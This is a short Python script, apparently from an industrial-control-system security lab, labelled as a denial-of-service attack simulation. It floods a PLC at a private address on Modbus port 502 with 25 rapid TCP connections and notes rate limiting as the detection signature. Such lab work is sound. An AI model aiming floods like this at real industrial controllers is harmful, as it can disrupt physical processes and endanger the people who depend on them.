print("==============================================")
print("      ATTACK 1: DENIAL OF SERVICE (DoS)      ")
print("==============================================")
print("Target:    PLC (192.168.30.2)")
print("Method:    Rapid connection flood (25 requests)")
print("Impact:    Controller resource exhaustion")
print("Signature: Threshold-based rate limiting")
print("----------------------------------------------")

import socket
import time

target = "192.168.30.2"
port = 502
total = 25

start = time.time()
for i in range(total):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect((target, port))
        sock.send(b"MODBUS")
        sock.close()
        
        if i < 3:
            print(f"[{i+1:02d}/25] Connection established")
        elif i == 3:
            print("              ...")
        elif i >= total - 3:
            print(f"[{i+1:02d}/25] Connection established")
            
    except:
        if i < 3 or i >= total - 3:
            print(f"[{i+1:02d}/25] Connection failed")
    
    time.sleep(0.04)

elapsed = time.time() - start
print("----------------------------------------------")
print(f"Summary: {total} connections in {elapsed:.2f}s")
print(f"Rate:    {total/elapsed:.1f} requests/second")
print("==============================================")
print("       [ ATTACK 1 SIMULATION COMPLETE ]       ")
print("==============================================")
